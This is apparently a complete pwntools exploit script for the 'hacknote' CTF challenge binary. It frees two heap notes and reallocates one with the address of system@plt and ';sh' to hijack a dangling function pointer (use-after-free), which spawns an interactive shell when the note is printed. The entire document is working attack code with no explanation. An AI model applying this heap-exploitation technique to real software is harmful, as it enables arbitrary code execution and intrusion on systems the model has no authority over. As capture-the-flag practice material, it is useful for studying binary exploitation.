#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack
import os, base64, math, time
context(arch = "i386", os = "linux", log_level = "debug")

def note_add(p, size, content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Note size :')
    p.sendline(str(size))
    p.recvuntil('Content :')
    p.send(content)

def note_delete(p, index):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(index))

def note_print(p, index):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(index))

p = process('./hacknote')
elf = ELF('./hacknote')
gdb_command =   """
                #b *0x80486ca
                #b *0x8048893
                #b *0x80488a9
                #b *0x804875c
                #b *0x804896C
                """

system_addr = elf.plt['system'] + 0x6
# gdb.attach(p, gdb_command)


note_add(p, 100, "/bin/sh\x00")
note_add(p, 100, "/bin/sh\x00")
note_delete(p, 0)
note_delete(p, 1)
note_add(p, 8, p32(system_addr) + ";sh\x00")
note_print(p, 0)


p.interactive()